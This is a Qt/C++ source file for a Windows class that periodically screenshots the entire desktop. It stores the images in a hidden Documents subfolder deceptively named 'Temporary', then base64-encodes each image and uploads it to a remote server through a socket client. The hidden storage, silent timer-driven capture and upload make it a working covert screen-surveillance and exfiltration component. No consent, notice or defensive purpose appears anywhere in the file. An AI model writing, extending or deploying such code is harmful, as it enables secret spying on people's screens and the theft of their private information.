#include "monitortimer.h"
#include "ConfigManager.h"
#include <windows.h>

#include <QDesktopWidget>
#include <QStandardPaths>
#include <QApplication>
#include <QDateTime>
#include <QPixmap>
#include <QScreen>
#include <QDebug>
#include <QDir>


MonitorTimer::MonitorTimer(QObject *parent) : QObject(parent)
{    
    m_savePath = getHiddenFold("Temporary");

    m_timer = new QTimer(this);

    m_timer->setSingleShot(false);
    connect(m_timer, SIGNAL(timeout()), this, SLOT(slot_screenShot()));

    m_socketClient = new SocketClient;
}

void MonitorTimer::startMonitor(int interval)
{
    qDebug() << "...startMonitor:" << m_savePath;
    m_timer->start(interval);
}

void MonitorTimer::stopMonitor()
{
    if( m_timer->isActive() ) {
        m_timer->stop();
    }
}

QString MonitorTimer::getHiddenFold(QString name)
{
    QDir dir(QStandardPaths::writableLocation( QStandardPaths::DocumentsLocation ));

    if( !dir.cd(name) ) {
        dir.mkdir(name);
        dir.cd(name);
    }
    SetFileAttributes((LPCWSTR)dir.absolutePath().unicode(),FILE_ATTRIBUTE_HIDDEN);
    return dir.absolutePath();
}

void MonitorTimer::slot_screenShot()
{
    QString fileName = QDateTime::currentDateTime().toString("yyyyMMddHHmmss") + ".png";
    QString imagePath = m_savePath + "/" + fileName;
    QScreen *screen = QGuiApplication::primaryScreen();
    QPixmap Pixmap = screen->grabWindow(QApplication::desktop()->winId(), 0, 0, QApplication::desktop()->width(), QApplication::desktop()->height());

    bool b_save = Pixmap.save(QDir::toNativeSeparators(imagePath), "png", 0);
    qDebug() << "save :" << QDir::toNativeSeparators(imagePath) << b_save;

    QFile file(QDir::toNativeSeparators(imagePath));

    file.open(QIODevice::ReadOnly);
    QByteArray ba = file.readAll();
    file.close();
    QString fileContent;
    fileContent.append(ba.toBase64());
    m_socketClient->uploadFile(fileName,fileContent);
}
